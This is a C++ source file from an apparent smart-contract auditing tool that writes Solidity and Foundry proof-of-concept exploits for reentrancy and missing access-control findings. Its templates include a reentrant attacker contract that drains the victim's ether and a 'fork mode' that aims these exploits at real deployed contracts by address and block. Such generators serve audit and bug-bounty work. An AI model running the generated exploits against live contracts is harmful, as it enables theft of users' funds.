#include "solc/report/PocGenerator.h"

#include <sstream>

namespace solc::report {

namespace {
// типизированная заглушка аргумента нужного ТИПА, чтобы PoC компилировался.
// сумма (uint) = STEP (согласована с депозитом); узкие uint кастуем, иначе Solidity
// не сузит uint256 неявно; bytesN/массивы/строки — нулевые значения своего типа
std::string defaultArg(const std::string& ty) {
    if (ty == "address")                 return "address(this)";
    if (ty == "bool")                    return "true";
    if (ty == "string" || ty == "bytes") return "\"\"";
    if (ty.rfind("bytes", 0) == 0)       return ty + "(0)";            // bytesN (фикс.)
    if (ty.find("[]") != std::string::npos) return "new " + ty + "(0)"; // динамич. массив
    if (ty == "uint256" || ty == "uint") return "STEP";
    if (ty.rfind("uint", 0) == 0 || ty.rfind("int", 0) == 0)
        return ty + "(STEP)";                                          // узкие целые: uint128(STEP)
    return "STEP";
}
// список аргументов из типов: "STEP, address(this)"
std::string argList(const std::vector<std::string>& types) {
    std::string s;
    for (size_t i = 0; i < types.size(); ++i) {
        if (i) s += ", ";
        s += defaultArg(types[i]);
    }
    return s;
}
// список типов для объявления интерфейса (без имён параметров): "uint256, address"
std::string ifaceParams(const std::vector<std::string>& types) {
    std::string s;
    for (size_t i = 0; i < types.size(); ++i) { if (i) s += ", "; s += types[i]; }
    return s;
}

// аргументы для access-control PoC: address → attacker (атакующий забирает права/владение)
std::string argListAC(const std::vector<std::string>& types) {
    std::string s;
    for (size_t i = 0; i < types.size(); ++i) {
        if (i) s += ", ";
        s += (types[i] == "address") ? "attacker" : defaultArg(types[i]);
    }
    return s;
}
}  // namespace

std::string PocGenerator::generateReentrancy(const std::string& contract, const Finding& f,
                                             const KleeWitness& w, const ForkConfig& fork) {
    const std::string& fn = f.function;   // уязвимая функция (напр. withdraw)
    std::ostringstream os;

    // --- форк-режим: эксплойт против РЕАЛЬНО развёрнутой жертвы (не new) ---
    if (fork.enabled) {
        const std::string I = "I" + contract;          // интерфейс жертвы
        const std::string vc = "target." + fn + "(" + argList(f.vulnParamTypes) + ")";
        os << "// SPDX-License-Identifier: UNLICENSED\n";
        os << "// PoC reentrancy (ФОРК-режим — реальная жертва)"
           << (w.confirmed ? " — СИМВОЛЬНО ПОДТВЕРЖДЁН KLEE" : "") << ", SCSA.\n";
        os << "// цель: " << contract << "." << fn << "; жертва: " << fork.victim
           << " @ блок " << fork.forkBlock << "\n";
        os << "// запуск: " << fork.rpcEnv << "=<rpc-url> forge test --match-contract "
           << contract << "ReentrancyForkTest -vvv\n";
        os << "// TODO(hunter): сверить блок форка (ДО патча) и точные значения депозита.\n";
        os << "pragma solidity ^0.8.13;\n\n";
        os << "import \"forge-std/Test.sol\";\n\n";
        // интерфейс жертвы из сигнатур (исходник развёрнутого контракта не нужен)
        os << "interface " << I << " {\n";
        os << "    function " << fn << "(" << ifaceParams(f.vulnParamTypes) << ") external;\n";
        if (!f.fundingFunction.empty())
            os << "    function " << f.fundingFunction << "("
               << ifaceParams(f.fundingParamTypes) << ") external payable;\n";
        os << "}\n\n";
        // атакующий (реентрантный callback)
        os << "contract " << contract << "Attacker {\n";
        os << "    " << I << " public target;\n";
        os << "    uint256 public constant STEP = 1 ether;\n";
        os << "    constructor(" << I << " _t) { target = _t; }\n";
        os << "    function attack() external payable {\n";
        if (!f.fundingFunction.empty())
            os << "        target." << f.fundingFunction << "{value: msg.value}("
               << argList(f.fundingParamTypes) << ");\n";
        os << "        " << vc << ";\n";
        os << "    }\n";
        os << "    receive() external payable {\n";
        os << "        if (address(target).balance >= STEP) " << vc << ";\n";
        os << "    }\n";
        os << "}\n\n";
        // тест: форк + вызов по адресу
        os << "contract " << contract << "ReentrancyForkTest is Test {\n";
        os << "    " << I << " victim;\n";
        os << "    " << contract << "Attacker attacker;\n";
        os << "    address constant VICTIM = " << fork.victim << ";\n";
        os << "    uint256 constant FORK_BLOCK = " << fork.forkBlock << ";\n";
        os << "    function setUp() public {\n";
        os << "        vm.createSelectFork(vm.envString(\"" << fork.rpcEnv << "\"), FORK_BLOCK);\n";
        os << "        victim = " << I << "(VICTIM);\n";
        os << "        attacker = new " << contract << "Attacker(victim);\n";
        os << "    }\n";
        os << "    function test_ReentrancyDrainsVictim() public {\n";
        os << "        uint256 victimBefore   = address(victim).balance;\n";
        os << "        uint256 attackerBefore = address(attacker).balance;\n";
        os << "        attacker.attack{value: 1 ether}();\n";
        os << "        assertLt(address(victim).balance,   victimBefore,   \"victim not drained\");\n";
        os << "        assertGt(address(attacker).balance, attackerBefore, \"attacker did not profit\");\n";
        os << "    }\n";
        os << "}\n";
        return os.str();
    }

    // вызов уязвимой функции с типизированными заглушками (STEP согласован с депозитом).
    // конкретные значения аргументов из KLEE-witness НЕ подставляем в сам вызов: они —
    // satisfying-модель (часто огромные), а рабочему PoC нужна сумма = депозит атакующего.
    // witness-аргументы показываем в шапке-комментарии (см. ниже)
    const std::string vulnCall = "target." + fn + "(" + argList(f.vulnParamTypes) + ")";

    os << "// SPDX-License-Identifier: UNLICENSED\n";
    if (w.confirmed) {
        // KLEE символьно доказал достижимость пути кражи — это не ложное срабатывание
        os << "// PoC reentrancy — СИМВОЛЬНО ПОДТВЕРЖДЁН KLEE (SCSA).\n";
        os << "// цель: " << contract << "." << fn;
        if (f.line > 0) os << " (строка " << f.line << ")";
        os << "\n";
        os << "// witness-модель KLEE (входы, при которых путь кражи достижим):\n";
        os << "//   balance >= " << (w.balance.empty() ? "1" : w.balance)
           << " wei, msg.value = " << (w.msgValue.empty() ? "0" : w.msgValue)
           << " wei, глубина реентрантности = " << w.depth << "\n";
        if (!w.argValues.empty()) {
            os << "//   аргументы уязвимой функции (satisfying-модель KLEE): ";
            for (size_t i = 0; i < w.argValues.size(); ++i) {
                if (i) os << ", ";
                os << "arg" << i << "=" << w.argValues[i];
            }
            os << "\n";
        }
        os << "//   оракул: total_sent > исходный_баланс (нарушение checks-effects-interactions).\n";
        os << "// TODO(hunter): для боевого протокола — форк жертвы и её конструктор (см. setUp).\n";
    } else {
        os << "// PoC-каркас reentrancy, сгенерирован SCSA.\n";
        os << "// цель: " << contract << "." << fn;
        if (f.line > 0) os << " (строка " << f.line << ")";
        os << "\n";
        os << "// TODO(hunter): проверить пути импорта, конструктор жертвы и депозит под протокол.\n";
    }
    os << "pragma solidity ^0.8.13;\n\n";
    os << "import \"forge-std/Test.sol\";\n";
    os << "import {" << contract << "} from \"../src/" << contract << ".sol\";\n\n";

    // --- атакующий контракт ---
    os << "// атакующий: реентрантно вызывает уязвимую функцию из callback,\n";
    os << "// пока у жертвы остаются средства\n";
    os << "contract " << contract << "Attacker {\n";
    os << "    " << contract << " public target;\n";
    os << "    uint256 public constant STEP = 1 ether;\n\n";
    os << "    constructor(" << contract << " _target) {\n";
    os << "        target = _target;\n";
    os << "    }\n\n";
    os << "    // точка входа атаки\n";
    os << "    function attack() external payable {\n";
    if (!f.fundingFunction.empty()) {
        // детектор нашёл функцию-депозит (пополняет тот же слот через msg.value)
        os << "        // депозит перед атакой (найден статически)\n";
        os << "        target." << f.fundingFunction << "{value: msg.value}("
           << argList(f.fundingParamTypes) << ");\n";
    } else {
        os << "        // TODO(hunter): если нужен предварительный депозит — вызвать его здесь\n";
    }
    os << "        " << vulnCall << ";\n";
    os << "    }\n\n";
    os << "    // реентрантный callback: пока жертва платит — заходим снова\n";
    os << "    receive() external payable {\n";
    os << "        if (address(target).balance >= STEP) {\n";
    os << "            " << vulnCall << ";\n";
    os << "        }\n";
    os << "    }\n";
    os << "}\n\n";

    // --- Foundry-тест, доказывающий кражу ---
    os << "contract " << contract << "ReentrancyTest is Test {\n";
    os << "    " << contract << " victim;\n";
    os << "    " << contract << "Attacker attacker;\n\n";
    os << "    function setUp() public {\n";
    os << "        // TODO(hunter): для реального протокола — vm.createSelectFork(RPC, block)\n";
    os << "        //              и адрес развёрнутой жертвы вместо new\n";
    os << "        victim = new " << contract << "();\n";
    os << "        vm.deal(address(victim), 10 ether);   // наполняем жертву\n";
    os << "        attacker = new " << contract << "Attacker(victim);\n";
    os << "    }\n\n";
    os << "    function test_ReentrancyDrainsVictim() public {\n";
    os << "        uint256 victimBefore   = address(victim).balance;\n";
    os << "        uint256 attackerBefore = address(attacker).balance;\n\n";
    os << "        attacker.attack{value: 1 ether}();\n\n";
    os << "        // доказательство эксплойта: баланс жертвы упал, атакующего — вырос\n";
    os << "        assertLt(address(victim).balance,   victimBefore,   \"victim not drained\");\n";
    os << "        assertGt(address(attacker).balance, attackerBefore, \"attacker did not profit\");\n";
    os << "    }\n";
    os << "}\n";

    return os.str();
}

std::string PocGenerator::generateAccessControl(const std::string& contract, const Finding& f,
                                                const KleeWitness& w, const ForkConfig& fork) {
    const std::string& fn = f.function;
    std::ostringstream os;

    // --- форк-режим: реальная жертва по адресу через интерфейс ---
    if (fork.enabled) {
        const std::string I = "I" + contract;
        os << "// SPDX-License-Identifier: UNLICENSED\n";
        os << "// PoC access-control (ФОРК-режим — реальная жертва)"
           << (w.confirmed ? " — СИМВОЛЬНО ПОДТВЕРЖДЁН KLEE" : "") << ", SCSA.\n";
        os << "// цель: " << contract << "." << fn << "; жертва: " << fork.victim
           << " @ блок " << fork.forkBlock << "\n";
        os << "// запуск: " << fork.rpcEnv << "=<rpc-url> forge test --match-contract "
           << contract << "AccessControlForkTest -vvv\n";
        os << "pragma solidity ^0.8.13;\n\n";
        os << "import \"forge-std/Test.sol\";\n\n";
        os << "interface " << I << " {\n";
        os << "    function " << fn << "(" << ifaceParams(f.vulnParamTypes) << ") external;\n";
        os << "}\n\n";
        os << "contract " << contract << "AccessControlForkTest is Test {\n";
        os << "    " << I << " victim;\n";
        os << "    address attacker = address(0xBEEF);\n";
        os << "    address constant VICTIM = " << fork.victim << ";\n";
        os << "    uint256 constant FORK_BLOCK = " << fork.forkBlock << ";\n";
        os << "    function setUp() public {\n";
        os << "        vm.createSelectFork(vm.envString(\"" << fork.rpcEnv << "\"), FORK_BLOCK);\n";
        os << "        victim = " << I << "(VICTIM);\n";
        os << "    }\n";
        os << "    // не-владелец исполняет привилегированную функцию; отсутствие revert = уязвимость\n";
        os << "    function test_MissingAccessControl() public {\n";
        os << "        vm.prank(attacker);\n";
        os << "        victim." << fn << "(" << argListAC(f.vulnParamTypes) << ");\n";
        os << "    }\n";
        os << "}\n";
        return os.str();
    }

    const std::string call = "target." + fn + "(" + argListAC(f.vulnParamTypes) + ")";

    os << "// SPDX-License-Identifier: UNLICENSED\n";
    if (w.confirmed) {
        os << "// PoC access-control — СИМВОЛЬНО ПОДТВЕРЖДЁН KLEE (SCSA).\n";
        os << "// цель: " << contract << "." << fn;
        if (f.line > 0) os << " (строка " << f.line << ")";
        os << "\n";
        os << "// KLEE: привилегированная запись (слот " << f.storageSlot
           << ") достижима при msg.sender != owner → отсутствие контроля доступа.\n";
    } else {
        os << "// PoC-каркас access-control, сгенерирован SCSA.\n";
        os << "// цель: " << contract << "." << fn << "\n";
    }
    os << "// TODO(hunter): для боевого протокола — форк жертвы и её конструктор (см. setUp).\n";
    os << "pragma solidity ^0.8.13;\n\n";
    os << "import \"forge-std/Test.sol\";\n";
    os << "import {" << contract << "} from \"../src/" << contract << ".sol\";\n\n";

    os << "contract " << contract << "AccessControlTest is Test {\n";
    os << "    " << contract << " victim;\n";
    os << "    address attacker = address(0xBEEF);   // произвольный не-владелец\n\n";
    os << "    function setUp() public {\n";
    os << "        // TODO(hunter): для реального протокола — vm.createSelectFork(RPC, block)\n";
    os << "        //              и адрес развёрнутой жертвы вместо new\n";
    os << "        victim = new " << contract << "();\n";
    os << "    }\n\n";
    os << "    // атакующий (не владелец) исполняет привилегированную функцию.\n";
    os << "    // защищённая функция здесь ревертнула бы (require(msg.sender==owner)); прохождение\n";
    os << "    // теста без revert = контроль доступа отсутствует (уязвимость подтверждена)\n";
    os << "    function test_MissingAccessControl() public {\n";
    os << "        " << contract << " target = victim;\n";
    os << "        vm.prank(attacker);\n";
    os << "        " << call << ";\n";
    os << "        // дошли сюда → " << fn << " исполнилась от имени не-владельца\n";
    os << "    }\n";
    os << "}\n";

    return os.str();
}

}  // namespace solc::report
